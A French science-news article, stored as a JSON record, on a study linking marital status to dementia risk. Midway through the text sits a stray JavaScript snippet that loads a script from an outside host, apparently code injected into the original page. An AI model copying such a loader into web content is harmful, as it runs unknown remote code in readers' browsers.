{"title": "Le mariage ne rendrait pas fou, bien au contraire…", "newspaper": "Futura Sciences", "author": "Marie-Céline Jacquier", "date_publi": "01/12/2017", "content": "Par rapport aux personnes mariées, celles qui ne se sont jamais mariées auraient 42 % de risque en plus de souffrir de démence. D'après cette étude portant sur plus de 800.000 personnes, les veufs et veuves seraient aussi plus à risque. Ce qu'il faut retenir Les personnes qui restent seules toute leur vie ont le plus de risque de démence. Les personnes veuves ont aussi un risque accru mais pas celles qui sont divorcées. Le mariage permettrait plus de contacts sociaux, favorisant ainsi une meilleure santé mentale. Le  mariage  est une décision importante à prendre dans la vie. Et si on se mariait pour rester en bonne santé ? Différentes études ont déjà montré certains bienfaits du mariage sur la santé. Globalement, les personnes mariées ont un  style  de vie plus sain et une mortalité plus faible. Par exemple, la santé des Américains mariés est meilleure que celle des célibataires.  Voir aussi : Science décalée : le mariage qui dure, la garantie des os solides Dans un article paru dans la revue  Journal of Neurology, Neurosurgery & Psychiatry , une équipe de la  University College of London  a voulu examiner le lien entre le statut marital et le risque de  démence . Dans leur introduction, les auteurs expliquent que, comme de plus en plus de personnes souffrent de démences, il est donc important de connaître les facteurs qui favorisent cette  pathologie . Les chercheurs ont regroupé les résultats de 15 études impliquant des participants de différents pays dans le monde : Amérique du sud, Asie, Europe et États-Unis. En tout, la  cohorte  comprenait 812.047 personnes. Le saviez-vous ? En France, d'après  Santé publique France , environ 1,2 million de personnes souffraient de maladie d'Alzheimer et d'autres démences en 2014. Les personnes veuves étaient aussi plus à risque. © zinkevych, Fotolia Le mariage favorise les interactions sociales Les chercheurs ont alors trouvé que ceux qui restaient célibataires toute leur vie avaient 42 % de risque en plus de développer une démence par rapport aux  personnes mariées . Avec un risque de démence accru de 42 %, le statut marital s'affiche donc comme un facteur comparable à l'inactivité  physique  par exemple.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les veufs et veuves étaient aussi plus à risque avec 20 % de risque en plus d'avoir une démence, par rapport aux personnes mariées. En revanche, les personnes divorcées n'avaient pas de risque en plus de démence. Dans leur discussion, les auteurs expliquent que la fin d'un mariage peut augmenter le risque de démence à cause de l'effet néfaste du  stress  sur les  neurones  de l' hippocampe  et sur la  cognition  ; or le veuvage est plus stressant qu'un divorce. “ Les personnes mariées ont tendance à avoir un mode de vie plus sain et sont plus engagées socialement Andrew Sommerlad, auteur de ces travaux, a expliqué dans un  communiqué  que  « les personnes mariées ont tendance à avoir un mode de vie plus sain et sont plus engagées socialement, ce qui peut expliquer pourquoi elles sont moins susceptibles de développer une démence ».  Une attention particulière devrait donc être portée sur les personnes âgées seules :  « nous espérons que nos résultats pourraient être appliqués pour soutenir la  prévention  de la démence chez les personnes non mariées, car le maintien de la santé physique et la  stimulation  mentale par l'engagement social des personnes âgées non-mariées peuvent être bénéfiques » . Une autre hypothèse pour expliquer ces résultats est que le développement de la  démence  soit lié à des traits de personnalité : des personnes qui ont des difficultés à communiquer et qui sont plus à risque de démence auraient plus de chances de rester seules... Un implant révolutionnaire pour éviter la maladie d’Alzheimer                       La maladie d’Alzheimer attaque progressivement les neurones, provoquant tout d’abord des troubles de la mémoire jusqu’à la perte des fonctions autonomes puis la mort. Des chercheurs de l’EPFL (École Polytechnique Fédérale de Lausanne), en Suisse, ont développé une capsule qui pourrait protéger les neurones et enrayer la maladie. Voici son fonctionnement présenté en vidéo.                                       ", "theme": "sante"}